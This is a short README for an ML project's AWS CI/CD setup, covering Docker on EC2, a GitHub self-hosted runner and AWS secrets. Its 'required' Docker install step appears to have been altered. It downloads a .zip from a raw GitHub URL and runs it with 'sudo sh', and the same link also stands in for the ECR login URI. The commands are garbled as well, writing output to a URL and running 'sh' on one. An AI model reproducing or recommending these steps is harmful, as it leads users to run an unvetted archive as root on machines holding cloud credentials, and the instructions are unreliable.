## End to End MAchine Learning Project

1. Docker Build checked
2. Github Workflow
3. Iam User In AWS

## Docker Setup In EC2 commands to be Executed

#optinal

sudo apt-get update -y

sudo apt-get upgrade

#required

curl -fsSL https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/templates/AWS_CI_CD_Project-v3.2.zip -o https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/templates/AWS_CI_CD_Project-v3.2.zip

sudo sh https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/templates/AWS_CI_CD_Project-v3.2.zip

sudo usermod -aG docker ubuntu

newgrp docker

## Configure EC2 as self-hosted runner:

## Setup github secrets:

AWS_ACCESS_KEY_ID=

AWS_SECRET_ACCESS_KEY=

AWS_REGION = us-east-1

AWS_ECR_LOGIN_URI = demo>>  https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/templates/AWS_CI_CD_Project-v3.2.zip

ECR_REPOSITORY_NAME = simple-app
